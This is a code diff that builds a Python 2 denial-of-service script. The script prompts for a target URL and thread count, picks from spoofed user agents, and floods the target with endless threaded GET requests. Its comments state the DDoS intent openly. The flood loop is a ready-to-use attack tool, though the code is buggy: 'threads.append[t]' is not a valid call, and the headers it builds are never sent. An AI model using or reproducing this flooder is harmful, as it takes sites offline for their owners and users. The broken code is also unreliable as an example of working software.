@@ -1,6 +1,9 @@
 import requests
+from random import choice
+import threading
 url=raw_input("[+] Enter the target URL: ")
-# copy code from a ddos tool
+tn=int(raw_input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
+# damn a lot of user agents
 useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
               "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
               "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
@@ -18,5 +21,20 @@ useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Fir
               "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
               "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
 ]
-def startheddos():
-  break # I have to go to lunch at school
+headers = {
+  'User-Agent': choice(useragents)
+}
+def httpspam():
+  while True:
+    response=requests.get(url)
+    print("[+] HTTP request sent")
+threads = []
+# threading
+for i in range(tn):
+  t = threading.Thread(target=httpspam)
+  t.daemon = True
+  threads.append[t]
+for i in range(tn):
+  threads[i].start()
+for i in range(tn):
+  threads[i].join()
